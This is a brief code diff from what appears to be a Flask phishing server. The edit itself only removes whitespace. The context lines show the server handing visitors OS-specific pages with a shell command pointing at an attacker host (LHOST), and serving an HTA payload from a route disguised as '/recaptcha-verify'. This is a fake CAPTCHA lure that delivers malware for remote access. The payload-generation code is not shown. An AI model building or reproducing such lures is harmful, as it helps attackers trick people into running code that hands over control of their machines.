@@ -106,7 +106,7 @@ def index():
         return render_template("index-linux.html", shell_command=LHOST)
     else:
         return render_template("index-windows.html", shell_command=LHOST)
-    
+
 @app.route('/recaptcha-verify')
 def serve_hta():
     return generate_hta_payload(LHOST)
